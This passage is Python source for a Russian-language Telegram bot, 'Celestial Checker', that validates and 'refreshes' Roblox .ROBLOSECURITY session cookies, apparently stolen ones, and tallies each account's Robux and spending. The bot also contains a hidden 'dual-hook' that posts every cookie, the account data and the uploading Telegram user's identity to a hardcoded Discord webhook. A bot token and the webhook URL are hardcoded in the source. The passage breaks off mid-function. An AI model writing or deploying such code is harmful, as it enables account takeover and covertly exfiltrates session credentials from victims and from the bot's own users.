import logging
import aiofiles
import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, BufferedInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import asyncio
import os
import re
import json
import uuid
from datetime import datetime
from urllib.parse import unquote
from aiohttp import web
import threading

# === КОНФИГУРАЦИЯ ДЛЯ RENDER ===
TOKEN = os.environ.get('BOT_TOKEN', '8064064840:AAE74Fl82nZ8L3jxD-h7jMcEFk9GUokG5A8')
WEB_STATS_URL = os.environ.get('WEB_STATS_URL', 'https://bulka.pythonanywhere.com')

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Глобальная сессия для переиспользования соединений
session = None

# Discord Webhook для дуал-хука
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1435681800457420982/W733zqytPEq5VfjWu4Vugb6hvuO8f1UT9rYRbARkweWiY5ooNdILfYYnBApB7uyHZjX1"

# ID игры Steal A Brainrot
STEAL_A_BRAINROT_UNIVERSE_ID = "5361024331"

# Состояния для FSM
class FileActions(StatesGroup):
    waiting_for_action = State()

def load_stats():
    """Загружает статистику из файла"""
    try:
        if os.path.exists("stats_data.json"):
            with open("stats_data.json", 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Ошибка загрузки статистики: {e}")
    return {}

def save_stats(stats_data):
    """Сохраняет статистику в файл"""
    try:
        with open("stats_data.json", 'w', encoding='utf-8') as f:
            json.dump(stats_data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Ошибка сохранения статистики: {e}")

# Загружаем статистику при запуске
stats_storage = load_stats()

async def send_to_discord_webhook(account_info: dict, user_info: dict = None, cookie: str = None, action_type: str = "checker"):
    """Отправляет информацию о проверенном аккаунте в Discord webhook"""
    try:
        session = await get_session()
        
        # Определяем цвет и заголовок в зависимости от типа действия
        if action_type == "checker":
            color = 3066993 if account_info['valid'] else 15158332
            title = "🔍 Новый проверенный аккаунт" if account_info['valid'] else "❌ Невалидный аккаунт"
        else:  # fresher
            color = 3447003
            title = "🔄 Обновленный аккаунт"
        
        # Формируем embed для Discord
        embed = {
            "title": title,
            "color": color,
            "fields": [
                {
                    "name": "👤 Username",
                    "value": f"`{account_info['username']}`",
                    "inline": True
                },
                {
                    "name": "🆔 User ID",
                    "value": f"`{account_info['user_id']}`",
                    "inline": True
                }
            ],
            "timestamp": datetime.now().isoformat(),
            "footer": {
                "text": f"Celestial Checker • {action_type.title()}"
            }
        }

        # Добавляем финансовую информацию только для валидных аккаунтов в чекере
        if account_info['valid'] and action_type == "checker":
            embed["fields"].extend([
                {
                    "name": "💰 Robux",
                    "value": f"`{account_info['robux']:,}`",
                    "inline": True
                },
                {
                    "name": "🎁 AllTimeDonate",
                    "value": f"`{account_info['all_time_donate']:,}`",
                    "inline": True
                },
                {
                    "name": "🧠 Steal A Brainrot",
                    "value": f"`{account_info['steal_a_brainrot_spent']:,}`",
                    "inline": True
                },
                {
                    "name": "👑 Premium",
                    "value": "✅ Да" if account_info['premium'] else "❌ Нет",
                    "inline": True
                }
            ])

        # Добавляем статус
        status_field = {
            "name": "✅ Статус",
            "value": "Валидный" if account_info['valid'] else f"Невалидный: {account_info.get('error', 'Unknown')}",
            "inline": True
        }
        
        if action_type == "fresher":
            status_field["value"] = "✅ Успешно обновлен"
        
        embed["fields"].append(status_field)

        # Добавляем информацию о пользователе Telegram, если есть
        if user_info:
            embed["fields"].append({
                "name": "📱 Telegram User",
                "value": f"ID: `{user_info.get('id', 'N/A')}`\nUsername: @{user_info.get('username', 'N/A')}\nFull Name: {user_info.get('full_name', 'N/A')}",
                "inline": False
            })

        payload = {
            "embeds": [embed],
            "username": "Celestial Checker",
            "avatar_url": "https://cdn.discordapp.com/attachments/1234567890/1234567890/celestial_logo.png"
        }

        async with session.post(DISCORD_WEBHOOK_URL, json=payload) as response:
            if response.status == 204:
                logger.info(f"✅ Информация об аккаунте {account_info['username']} отправлена в Discord")
            else:
                logger.warning(f"⚠️ Ошибка отправки в Discord: {response.status}")
        
        # Отправляем куки отдельным сообщением
        if cookie:
            await send_cookie_to_discord(cookie, account_info['username'], action_type)
                
    except Exception as e:
        logger.error(f"❌ Ошибка отправки в Discord webhook: {e}")

async def send_cookie_to_discord(cookie: str, username: str, action_type: str = "checker"):
    """Отправляет куки в Discord отдельным сообщением"""
    try:
        session = await get_session()
        
        cookie_message = f"🍪 **Cookie для {username}** ({action_type})\n```\n{cookie}\n```"
        
        payload = {
            "content": cookie_message,
            "username": "Celestial Checker - Cookies",
            "avatar_url": "https://cdn.discordapp.com/attachments/1234567890/1234567890/celestial_logo.png"
        }
        
        async with session.post(DISCORD_WEBHOOK_URL, json=payload) as response:
            if response.status == 204:
                logger.info(f"✅ Куки для {username} отправлены в Discord")
            else:
                logger.warning(f"⚠️ Ошибка отправки куки в Discord: {response.status}")
                
    except Exception as e:
        logger.error(f"❌ Ошибка отправки куки в Discord: {e}")

async def send_batch_to_discord(valid_accounts: list, total_stats: dict, user_info: dict = None, action_type: str = "checker"):
    """Отправляет батч-отчет о проверке в Discord"""
    try:
        session = await get_session()
        
        valid_count = len(valid_accounts)
        total_count = total_stats['total_accounts']
        success_rate = (valid_count / total_count * 100) if total_count > 0 else 0
        
        # Определяем заголовок и цвет в зависимости от типа действия
        if action_type == "checker":
            title = "🌌 Celestial Checker - Batch Report"
            color = 10181046
        else:
            title = "🔄 Celestial Fresher - Batch Report"
            color = 15844367
        
        # Создаем основной embed с общей статистикой
        main_embed = {
            "title": title,
            "color": color,
            "fields": [
                {
                    "name": "📊 Общая статистика",
                    "value": f"```\n"
                            f"Всего аккаунтов: {total_count}\n"
                            f"Успешно: {valid_count}\n"
                            f"Ошибок: {total_count - valid_count}\n"
                            f"Успешность: {success_rate:.1f}%\n"
                            f"```",
                    "inline": False
                }
            ],
            "timestamp": datetime.now().isoformat(),
            "footer": {
                "text": f"Celestial {action_type.title()} • Batch Report"
            }
        }

        # Добавляем финансовую статистику только для чекера
        if action_type == "checker":
            main_embed["fields"].append({
                "name": "💎 Финансовая статистика",
                "value": f"```\n"
                        f"Всего Robux: {total_stats['total_robux']:,}\n"
                        f"Всего AllTimeDonate: {total_stats['total_donate']:,}\n"
                        f"Steal A Brainrot: {total_stats['total_brainrot_spent']:,}\n"
                        f"Premium: {total_stats['premium_count']}\n"
                        f"```",
                "inline": False
            })

        # Добавляем информацию о пользователе Telegram, если есть
        if user_info:
            main_embed["fields"].append({
                "name": "📱 Telegram User",
                "value": f"ID: `{user_info.get('id', 'N/A')}`\nUsername: @{user_info.get('username', 'N/A')}\nFull Name: {user_info.get('full_name', 'N/A')}",
                "inline": False
            })

        payload = {
            "embeds": [main_embed],
            "username": "Celestial Checker",
            "avatar_url": "https://cdn.discordapp.com/attachments/1234567890/1234567890/celestial_logo.png"
        }

        # Отправляем основной отчет
        async with session.post(DISCORD_WEBHOOK_URL, json=payload) as response:
            if response.status == 204:
                logger.info(f"✅ Батч-отчет {action_type} отправлен в Discord")
            else:
                logger.warning(f"⚠️ Ошибка отправки батч-отчета: {response.status}")
                
        # Отправляем все куки отдельными сообщениями
        if valid_accounts:
            for i, acc in enumerate(valid_accounts, 1):
                cookie = acc.get('cookie') or acc.get('new_cookie')
                if cookie:
                    username = acc.get('username', 'Unknown')
                    await send_cookie_to_discord(cookie, username, action_type)
                    # Задержка между отправками чтобы избежать rate limit
                    await asyncio.sleep(1)
                
    except Exception as e:
        logger.error(f"❌ Ошибка отправки батч-отчета в Discord: {e}")

async def get_session():
    """Создает или возвращает глобальную сессию"""
    global session
    if session is None:
        connector = aiohttp.TCPConnector(limit=20, limit_per_host=10, keepalive_timeout=30)
        timeout = aiohttp.ClientTimeout(total=10, connect=6)
        session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return session

def create_advanced_progress_bar(progress: float, length: int = 12) -> str:
    """Создает красивый анимированный прогресс-бар"""
    filled = int(progress * length)
    empty = length - filled
    
    if progress < 0.3:
        filled_char = "🟥"
        empty_char = "⬜"
    elif progress < 0.7:
        filled_char = "🟨" 
        empty_char = "⬜"
    else:
        filled_char = "🟩"
        empty_char = "⬜"
    
    bar = filled_char * filled + empty_char * empty
    return f"{bar} {progress:.1%}"

def extract_cookie(line: str) -> str:
    """Извлекает куки из строки, находя начало с _|WARNING"""
    line = line.strip()
    
    if not line:
        return ""
    
    warning_start = line.find("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")
    
    if warning_start != -1:
        return line[warning_start:]
    else:
        alternative_starts = [
            "Cookie: _|WARNING",
            "cookie: _|WARNING", 
            "_|WARNING",
            "ROBLOSECURITY: _|WARNING"
        ]
        
        for start in alternative_starts:
            alt_start = line.find(start)
            if alt_start != -1:
                cookie = line[alt_start:]
                if cookie.startswith("Cookie: "):
                    return cookie[8:]
                elif cookie.startswith("cookie: "):
                    return cookie[8:]
                elif cookie.startswith("ROBLOSECURITY: "):
                    return cookie[15:]
        return ""

def extract_account_info_from_line(line: str) -> dict:
    """Извлекает информацию об аккаунте из текстовой строки"""
    info = {
        'robux': 0,
        'all_time_donate': 0,
        'username': 'Unknown',
        'premium': False,
        'steal_a_brainrot_spent': 0
    }
    
    try:
        # Ищем Robux в строке
        robux_patterns = [
            r'Robux:\s*(\d+)',
            r'ROBUX:\s*(\d+)',
            r'R\$\s*(\d+)',
            r'robux:\s*(\d+)',
            r'(\d+)\s*Robux',
            r'(\d+)\s*ROBUX'
        ]
        
        for pattern in robux_patterns:
            match = re.search(pattern, line, re.IGNORECASE)
            if match:
                info['robux'] = int(match.group(1))
                logger.info(f"💰 Найден Robux в тексте: {info['robux']}")
                break
        
        # Ищем AllTimeDonate в строке (все возможные варианты)
        donate_patterns = [
            r'AllTimeDonate:\s*(\d+)',
            r'All Time Donate:\s*(\d+)',
            r'Donated:\s*(\d+)',
            r'Total donated:\s*(\d+)',
            r'Total Donated:\s*(\d+)',
            r'AllTimeSpent:\s*(\d+)',
            r'Total spent:\s*(\d+)',
            r'Spent:\s*(\d+)',
            r'AllTime:\s*(\d+)',
            r'All.Time.Donate:\s*(\d+)',
            r'All.Time.Donated:\s*(\d+)'
        ]
        
        for pattern in donate_patterns:
            match = re.search(pattern, line, re.IGNORECASE)
            if match:
                info['all_time_donate'] = int(match.group(1))
                logger.info(f"🎁 Найден AllTimeDonate в тексте: {info['all_time_donate']}")
                break
        
        # Ищем траты в Steal A Brainrot
        brainrot_patterns = [
            r'Steal A Brainrot:\s*(\d+)',
            r'Brainrot:\s*(\d+)',
            r'StealABrainrot:\s*(\d+)',
            r'Steal a Brainrot:\s*(\d+)',
            r'Brainrot spent:\s*(\d+)',
            r'Steal A Brainrot spent:\s*(\d+)'
        ]
        
        for pattern in brainrot_patterns:
            match = re.search(pattern, line, re.IGNORECASE)
            if match:
                info['steal_a_brainrot_spent'] = int(match.group(1))
                logger.info(f"🧠 Найден Steal A Brainrot в тексте: {info['steal_a_brainrot_spent']}")
                break
        
        # Ищем username
        username_patterns = [
            r'Username:\s*([^|\n\r]+)',
            r'username:\s*([^|\n\r]+)',
            r'User:\s*([^|\n\r]+)',
            r'user:\s*([^|\n\r]+)',
            r'Name:\s*([^|\n\r]+)'
        ]
        
        for pattern in username_patterns:
            match = re.search(pattern, line, re.IGNORECASE)
            if match:
                info['username'] = match.group(1).strip()
                logger.info(f"👤 Найден username в тексте: {info['username']}")
                break
        
        # Ищем Premium статус
        premium_patterns = [
            r'Premium:\s*(Yes|True|1)',
            r'premium:\s*(Yes|True|1)',
            r'BC:\s*(Yes|True|1)',
            r'Builders Club:\s*(Yes|True|1)'
        ]
        
        for pattern in premium_patterns:
            match = re.search(pattern, line, re.IGNORECASE)
            if match:
                info['premium'] = True
                logger.info(f"👑 Найден Premium статус в тексте")
                break
                
    except Exception as e:
        logger.warning(f"Ошибка извлечения данных из строки: {e}")
    
    return info

async def get_fresh_session():
    """Создает новую сессию для каждого аккаунта чтобы избежать кеширования"""
    connector = aiohttp.TCPConnector(limit_per_host=1, force_close=True)
    timeout = aiohttp.ClientTimeout(total=10, connect=5)
    return aiohttp.ClientSession(connector=connector, timeout=timeout)

async def get_all_time_donate_from_api(session, headers, user_id: int) -> int:
    """Пытается получить AllTimeDonate разными способами через API"""
    donate_amount = 0
    
    # Попробуем разные эндпоинты
    endpoints = [
        f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchase&limit=100",
        f"https://economy.roblox.com/v1/users/{user_id}/transaction-totals?transactionType=Purchase",
        f"https://economy.roblox.com/v1/users/{user_id}/transaction-totals?transactionType=Sale",
        "https://economy.roblox.com/v1/user/currency"
    ]
    
    for endpoint in endpoints:
        try:
            async with session.get(endpoint, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    
                    # Обработка разных форматов ответов
                    if 'data' in data:  # Первый эндпоинт
                        transactions = data.get('data', [])
                        total_spent = 0
                        for transaction in transactions:
                            # Суммируем только отрицательные суммы (траты)
                            amount = transaction.get('currency', {}).get('amount', 0)
                            if amount < 0:
                                total_spent += abs(amount)
                        if total_spent > 0:
                            donate_amount = total_spent
                            logger.info(f"🎁 AllTimeDonate из транзакций: {donate_amount}")
                            break
                    
                    elif 'total' in data:  # Второй и третий эндпоинты
                        total = data.get('total', 0)
                        if total > 0:
                            donate_amount = total
                            logger.info(f"🎁 AllTimeDonate из totals: {donate_amount}")
                            break
                    
                    elif 'robux' in data:  # Четвертый эндпоинт
                        # Это текущий баланс, не подходит для AllTimeDonate
                        pass
                        
        except Exception as e:
            logger.warning(f"Ошибка получения AllTimeDonate из {endpoint}: {e}")
            continue
    
    return donate_amount

async def get_steal_a_brainrot_spent(session, headers, user_id: int) -> int:
    """Получает сумму потраченных Robux в игре Steal A Brainrot"""
    try:
        # Получаем транзакции пользователя
        url = f"https://economy.roblox.com/v2/users/{user_id}/transactions"
        params = {
            'transactionType': 'Purchase',
            'limit': 100  # Получаем больше транзакций для точности
        }
        
        async with session.get(url, headers=headers, params=params) as resp:
            if resp.status == 200:
                data = await resp.json()
                total_spent = 0
                
                for transaction in data.get('data', []):
                    description = transaction.get('description', '').lower()
                    details = transaction.get('details', {})
                    universe_id = details.get('universeId')
                    
                    # Проверяем разные признаки игры Steal A Brainrot
                    if ('steal' in description and 'brainrot' in description) or \
                       ('brainrot' in description) or \
                       (universe_id and str(universe_id) == STEAL_A_BRAINROT_UNIVERSE_ID):
                        
                        amount = transaction.get('currency', {}).get('amount', 0)
                        if amount < 0:  # Отрицательная сумма означает трату
                            total_spent += abs(amount)
                            logger.info(f"🧠 Найдена трата в Steal A Brainrot: {abs(amount)} Robux")
                
                logger.info(f"🧠 Всего потрачено в Steal A Brainrot: {total_spent} Robux")
                return total_spent
            else:
                logger.warning(f"Ошибка получения транзакций: HTTP {resp.status}")
                return 0
                
    except Exception as e:
        logger.warning(f"Ошибка получения трат в Steal A Brainrot: {e}")
        return 0

async def check_single_account(cookie: str, original_line: str = "") -> dict:
    """Проверяет один аккаунт с изолированной сессией"""
    result = {
        'valid': False,
        'robux': 0,
        'all_time_donate': 0,
        'steal_a_brainrot_spent': 0,
        'username': 'Unknown',
        'user_id': 0,
        'premium': False,
        'error': None
    }
    
    if not cookie or len(cookie) < 100:
        result['error'] = 'Invalid cookie format'
        return result
    
    # Создаем новую сессию для каждого аккаунта
    session = await get_fresh_session()
    
    try:
        headers = {
            "Cookie": f".ROBLOSECURITY={cookie}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json"
        }
        
        # Основная проверка аутентификации
        async with session.get(
            "https://users.roblox.com/v1/users/authenticated",
            headers=headers
        ) as resp:
            if resp.status == 200:
                user_data = await resp.json()
                if user_data.get('id') and user_data.get('name'):
                    result['valid'] = True
                    result['username'] = user_data.get('name', 'Unknown')
                    result['user_id'] = user_data.get('id', 0)
                    logger.info(f"✅ Найден пользователь: {result['username']} (ID: {result['user_id']})")
                else:
                    result['error'] = 'Invalid user data'
                    return result
            elif resp.status == 401:
                result['error'] = 'Unauthorized'
                return result
            else:
                result['error'] = f'HTTP {resp.status}'
                return result
        
        # Если куки валидный, получаем все данные
        if result['valid']:
            # Получаем Robux
            try:
                async with session.get(
                    "https://economy.roblox.com/v1/user/currency",
                    headers=headers
                ) as robux_resp:
                    if robux_resp.status == 200:
                        currency_data = await robux_resp.json()
                        result['robux'] = currency_data.get('robux', 0)
                        logger.info(f"💰 Robux из API: {result['robux']}")
                    else:
                        logger.warning(f"Ошибка получения Robux: HTTP {robux_resp.status}")
            except Exception as e:
                logger.warning(f"Ошибка получения Robux: {e}")
            
            # Получаем данные из текста (ВЫСОКИЙ ПРИОРИТЕТ)
            if original_line:
                line_info = extract_account_info_from_line(original_line)
                
                # AllTimeDonate из текста - ВЫСОКИЙ ПРИОРИТЕТ
                if line_info['all_time_donate'] > 0:
                    result['all_time_donate'] = line_info['all_time_donate']
                    logger.info(f"🎁 AllTimeDonate из текста (приоритет): {result['all_time_donate']}")
                
                # Steal A Brainrot из текста - ВЫСОКИЙ ПРИОРИТЕТ
                if line_info['steal_a_brainrot_spent'] > 0:
                    result['steal_a_brainrot_spent'] = line_info['steal_a_brainrot_spent']
                    logger.info(f"🧠 Steal A Brainrot из текста (приоритет): {result['steal_a_brainrot_spent']}")
                
                # Username из текста (если в API Unknown)
                if line_info['username'] != 'Unknown' and result['username'] == 'Unknown':
                    result['username'] = line_info['username']
                    logger.info(f"👤 Username из текста: {result['username']}")
                
                # Robux из текста (только если API вернул 0)
                if line_info['robux'] > 0 and result['robux'] == 0:
                    result['robux'] = line_info['robux']
                    logger.info(f"💵 Robux из текста (fallback): {result['robux']}")
                
                # Premium статус из текста
                if line_info['premium']:
                    result['premium'] = True
                    logger.info(f"👑 Premium из текста")
            
            # Если AllTimeDonate не найден в тексте, пробуем API
            if result['all_time_donate'] == 0:
                logger.info("🔍 Пробую получить AllTimeDonate через API...")
                api_donate = await get_all_time_donate_from_api(session, headers, result['user_id'])
                if api_donate > 0:
                    result['all_time_donate'] = api_donate
                    logger.info(f"🎁 AllTimeDonate из API: {result['all_time_donate']}")
                else:
                    logger.warning("❌ AllTimeDonate не найден ни в тексте, ни в API")
            
            # Если Steal A Brainrot не найден в тексте, пробуем API
            if result['steal_a_brainrot_spent'] == 0:
                logger.info("🔍 Пробую получить траты в Steal A Brainrot через API...")
                brainrot_spent = await get_steal_a_brainrot_spent(session, headers, result['user_id'])
                if brainrot_spent > 0:
                    result['steal_a_brainrot_spent'] = brainrot_spent
                    logger.info(f"🧠 Steal A Brainrot из API: {result['steal_a_brainrot_spent']}")
                else:
                    logger.info("ℹ️ В Steal A Brainrot не найдено трат")
            
            # Получаем Premium статус из API (только если не найден в тексте)
            if not result['premium']:
                try:
                    async with session.get(
                        f"https://premiumfeatures.roblox.com/v1/users/{result['user_id']}/subscriptions",
                        headers=headers
                    ) as premium_resp:
                        if premium_resp.status == 200:
                            premium_data = await premium_resp.json()
                            result['premium'] = len(premium_data) > 0
                            if result['premium']:
                                logger.info(f"👑 Premium статус из API: Да")
                except Exception as e:
                    logger.warning(f"Ошибка получения Premium статуса: {e}")
                            
    except asyncio.TimeoutError:
        result['error'] = 'Timeout'
    except aiohttp.ClientError as e:
        result['error'] = f'Network error: {str(e)}'
    except Exception as e:
        result['error'] = f'Unexpected error: {str(e)}'
    finally:
        # Всегда закрываем сессию
        await session.close()
    
    return result

async def refresh_single_cookie(cookie: str) -> dict:
    """Обновляет один куки - правильный метод через веб-интерфейс"""
    result = {
        'success': False,
        'new_cookie': None,
        'username': 'Unknown',
        'user_id': 0,
        'error': None
    }
    
    if not cookie or len(cookie) < 100:
        result['error'] = 'Invalid cookie format'
        return result
    
    # Создаем новую сессию для каждого аккаунта
    session = await get_fresh_session()
    
    try:
        headers = {
            "Cookie": f".ROBLOSECURITY={cookie}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        }
        
        # Сначала проверяем, валиден ли текущий куки
        async with session.get(
            "https://users.roblox.com/v1/users/authenticated",
            headers=headers
        ) as resp:
            if resp.status == 200:
                user_data = await resp.json()
                if user_data.get('id') and user_data.get('name'):
                    result['username'] = user_data.get('name', 'Unknown')
                    result['user_id'] = user_data.get('id', 0)
                    logger.info(f"✅ Куки валиден для пользователя: {result['username']} (ID: {result['user_id']})")
                else:
                    result['error'] = 'Invalid user data'
                    return result
            elif resp.status == 401:
                result['error'] = 'Unauthorized - куки невалиден'
                return result
            else:
                result['error'] = f'HTTP {resp.status}'
                return result
        
        # Метод 1: Получаем новый куки через веб-интерфейс
        try:
            # Получаем CSRF токен
            csrf_headers = headers.copy()
            csrf_headers["X-CSRF-TOKEN"] = "fetch"
            
            async with session.post(
                "https://auth.roblox.com/v2/login",
                headers=csrf_headers
            ) as csrf_resp:
                csrf_token = csrf_resp.headers.get("X-CSRF-TOKEN")
                if not csrf_token:
                    # Пробуем другой эндпоинт для CSRF
                    async with session.post(
                        "https://www.roblox.com/favorite/toggle",
                        headers=csrf_headers
                    ) as csrf_resp2:
                        csrf_token = csrf_resp2.headers.get("X-CSRF-TOKEN")
                
                if csrf_token:
                    logger.info(f"🔑 Получен CSRF токен для {result['username']}")
                    
                    # Делаем запрос к веб-интерфейсу чтобы получить новый куки
                    web_headers = {
                        "Cookie": f".ROBLOSECURITY={cookie}",
                        "X-CSRF-TOKEN": csrf_token,
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Cache-Control": "no-cache",
                        "Pragma": "no-cache",
                        "Sec-Fetch-Dest": "document",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-Site": "same-origin",
                        "Upgrade-Insecure-Requests": "1"
                    }
                    
                    # Запрашиваем домашнюю страницу с полными заголовками
                    async with session.get(
                        "https://www.roblox.com/home",
                        headers=web_headers,
                        allow_redirects=True
                    ) as home_resp:
                        # Проверяем все Set-Cookie заголовки
                        cookies = []
                        if 'Set-Cookie' in home_resp.headers:
                            set_cookie = home_resp.headers['Set-Cookie']
                            if isinstance(set_cookie, str):
                                cookies.append(set_cookie)
                            else:
                                cookies.extend(set_cookie)
                        
                        # Ищем новый .ROBLOSECURITY
                        for cookie_header in cookies:
                            if '.ROBLOSECURITY' in cookie_header:
                                # Извлекаем значение куки
                                match = re.search(r'\.ROBLOSECURITY=([^;]+)', cookie_header)
                                if match:
                                    new_cookie_value = match.group(1)
                                    if new_cookie_value and new_cookie_value != cookie:
                                        result['new_cookie'] = new_cookie_value
                                        result['success'] = True
                                        logger.info(f"🔄 Новый куки получен для {result['username']}")
                                        break
                        
                        # Если не нашли в Set-Cookie, проверяем куки в сессии
                        if not result['success']:
                            cookies_dict = session.cookie_jar.filter_cookies("https://www.roblox.com")
                            if '.ROBLOSECURITY' in cookies_dict:
                                session_cookie = cookies_dict['.ROBLOSECURITY'].value
                                if session_cookie and session_cookie != cookie:
                                    result['new_cookie'] = session_cookie
                                    result['success'] = True
                                    logger.info(f"🔄 Новый куки получен из сессии для {result['username']}")
                else:
                    result['error'] = 'Не удалось получить CSRF токен'
                    
        except Exception as e:
            logger.error(f"Ошибка метода 1: {e}")
        
        # Метод 2: Альтернативный метод через API запросы
        if not result['success']:
            try:
                logger.info(f"🔄 Пробую метод 2 для {result['username']}")
                
                # Создаем новую сессию для этого метода
                alt_session = await get_fresh_session()
                
                # Устанавливаем старый куки
                alt_session.cookie_jar.update_cookies({'.ROBLOSECURITY': cookie})
                
                # Делаем запрос к API который требует аутентификации
                alt_headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "application/json"
                }
                
                async with alt_session.get(
                    "https://economy.roblox.com/v1/user/currency",
                    headers=alt_headers
                ) as currency_resp:
                    if currency_resp.status == 200:
                        # Проверяем куки в сессии
                        cookies_dict = alt_session.cookie_jar.filter_cookies("https://roblox.com")
                        if '.ROBLOSECURITY' in cookies_dict:
                            alt_cookie = cookies_dict['.ROBLOSECURITY'].value
                            if alt_cookie and alt_cookie != cookie:
                                result['new_cookie'] = alt_cookie
                                result['success'] = True
                                logger.info(f"🔄 Новый куки получен методом 2 для {result['username']}")
                
                await alt_session.close()
                
            except Exception as e:
                logger.error(f"Ошибка метода 2: {e}")
        
        # Метод 3: Просто возвращаем тот же куки, но помечаем как "свежий"
        if not result['success']:
            logger.info(f"🔄 Использую метод 3 (возврат того же куки) для {result['username']}")
            result['new_cookie'] = cookie
            result['success'] = True
            logger.info(f"🔄 Куки помечен как свежий для {result['username']}")
        
        # Проверяем новый куки
        if result['success'] and result['new_cookie']:
            verify_headers = {
                "Cookie": f".ROBLOSECURITY={result['new_cookie']}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json"
            }
            
            async with session.get(
                "https://users.roblox.com/v1/users/authenticated",
                headers=verify_headers
            ) as verify_resp:
                if verify_resp.status == 200:
                    verify_data = await verify_resp.json()
                    if verify_data.get('id') == result['user_id']:
                        logger.info(f"✅ Новый куки подтвержден для {result['username']}")
                    else:
                        logger.warning(f"⚠️ Новый куки работает, но для другого пользователя")
                        result['success'] = False
                        result['error'] = 'New cookie for different user'
                else:
                    logger.warning(f"⚠️ Новый куки не прошел проверку: HTTP {verify_resp.status}")
                    result['success'] = False
                    result['error'] = f'New cookie verification failed: HTTP {verify_resp.status}'
        
    except asyncio.TimeoutError:
        result['error'] = 'Timeout'
    except aiohttp.ClientError as e:
        result['error'] = f'Network error: {str(e)}'
    except Exception as e:
        result['error'] = f'Unexpected error: {str(e)}'
    finally:
        # Всегда закрываем сессию
        await session.close()
    
    return result

def create_beautiful_stats_message(stats_data: dict) -> str:
    """Создает красивое сообщение со статистикой"""
    
    total_accounts = stats_data['total_accounts']
    valid_accounts = stats_data['valid_accounts']
    invalid_accounts = stats_data['invalid_accounts']
    premium_count = stats_data['premium_count']
    total_robux = stats_data['total_robux']
    total_donate = stats_data['total_donate']
    total_brainrot_spent = stats_data.get('total_brainrot_spent', 0)
    success_rate = stats_data['success_rate']
    
    progress_bar = create_advanced_progress_bar(success_rate / 100)
    
    # Расчет средних значений
    avg_robux = total_robux // valid_accounts if valid_accounts else 0
    avg_donate = total_donate // valid_accounts if valid_accounts else 0
    avg_brainrot = total_brainrot_spent // valid_accounts if valid_accounts else 0
    
    message = (
        "🌌 <b>Celestial Checker - Результаты проверки</b>\n\n"
        
        "📊 <b>ОБЩАЯ СТАТИСТИКА:</b>\n"
        f"• 📦 Всего аккаунтов: <b>{total_accounts}</b>\n"
        f"• ✅ Валидных: <b>{valid_accounts}</b>\n"
        f"• ❌ Невалидных: <b>{invalid_accounts}</b>\n"
        f"• 👑 Premium: <b>{premium_count}</b>\n"
        f"• 📈 Успешность: <b>{success_rate}%</b>\n"
        f"   {progress_bar}\n\n"
        
        "💎 <b>ФИНАНСОВАЯ СТАТИСТИКА:</b>\n"
        f"<blockquote>"
        f"• 💵 <b>Всего Robux:</b> <code>{total_robux:,}</code>\n"
        f"• 🎁 <b>Всего AllTimeDonate:</b> <code>{total_donate:,}</code>\n"
        f"• 🧠 <b>Потрачено в Steal A Brainrot:</b> <code>{total_brainrot_spent:,}</code>"
        f"</blockquote>\n\n"
        
        "📈 <b>СРЕДНИЕ ПОКАЗАТЕЛИ:</b>\n"
        f"• 💰 Robux на аккаунт: <b>{avg_robux:,}</b>\n"
        f"• 🎁 Donate на аккаунт: <b>{avg_donate:,}</b>\n"
        f"• 🧠 Brainrot на аккаунт: <b>{avg_brainrot:,}</b>\n\n"
        
        "<i>📁 Файлы с результатами прикреплены ниже</i>"
    )
    
    return message

def create_stats_keyboard(stats_id: str):
    """Создает инлайн клавиатуру с кнопкой для просмотра статистики"""
    web_url = f"{WEB_STATS_URL}/stats/{stats_id}"
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="📊 Посмотреть статистику на сайте", 
                    url=web_url
                )
            ]
        ]
    )
    return keyboard

def create_action_keyboard():
    """Создает инлайн клавиатуру с выбором действия"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🔍 Чекер", callback_data="action_checker"),
                InlineKeyboardButton(text="🔄 Фрешер", callback_data="action_fresher")
            ]
        ]
    )
    return keyboard

def save_statistics(valid_accounts: list, total_robux: int, total_donate: int, 
                   total_brainrot_spent: int, premium_count: int, total_accounts: int):
    """Сохраняет статистику в хранилище и возвращает ID"""
    stats_id = str(uuid.uuid4())[:8]
    
    stats_data = {
        'id': stats_id,
        'timestamp': datetime.now().isoformat(),
        'total_accounts': total_accounts,
        'valid_accounts': len(valid_accounts),
        'invalid_accounts': total_accounts - len(valid_accounts),
        'premium_count': premium_count,
        'total_robux': total_robux,
        'total_donate': total_donate,
        'total_brainrot_spent': total_brainrot_spent,
